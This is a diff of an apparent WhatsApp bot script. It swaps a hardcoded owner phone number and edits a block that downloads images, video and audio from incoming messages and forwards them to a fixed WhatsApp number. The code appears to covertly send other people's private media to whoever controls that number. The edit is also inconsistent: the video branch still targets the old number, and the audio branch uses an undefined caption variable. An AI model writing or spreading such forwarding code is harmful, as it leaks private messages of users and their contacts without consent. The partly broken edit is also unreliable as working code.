@@ -41,7 +41,7 @@ const {
   const path = require('path')
   const prefix = config.PREFIX
   
-  const ownerNumber = ['254714342128']
+  const ownerNumber = ['254790997279']
   
   const tempDir = path.join(os.tmpdir(), 'cache-temp')
   if (!fs.existsSync(tempDir)) {
@@ -144,14 +144,14 @@ console.log("Session downloaded ✅")
     if (jawadik.message.imageMessage) {
     let cap = jawadik.message.imageMessage.caption;
     let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.imageMessage);
-    return conn.sendMessage("254714342128@s.whatsapp.net", { image: { url: anu }, caption: cap }, { quoted: mek });
+    return conn.sendMessage("254790997279@s.whatsapp.net", { image: { url: anu }, caption: cap }, { quoted: mek });
   } if (jawadik.message.videoMessage) {
     let cap = jawadik.message.videoMessage.caption;
     let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.videoMessage);
     return conn.sendMessage("254714342128@s.whatsapp.net", { video: { url: anu }, caption: cap }, { quoted: mek });
   } if (jawadik.message.audioMessage) {
     let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.audioMessage);
-    return conn.sendMessage("254714342128@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
+    return conn.sendMessage("254790997279@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
   }
   }
   const m = sms(conn, mek)
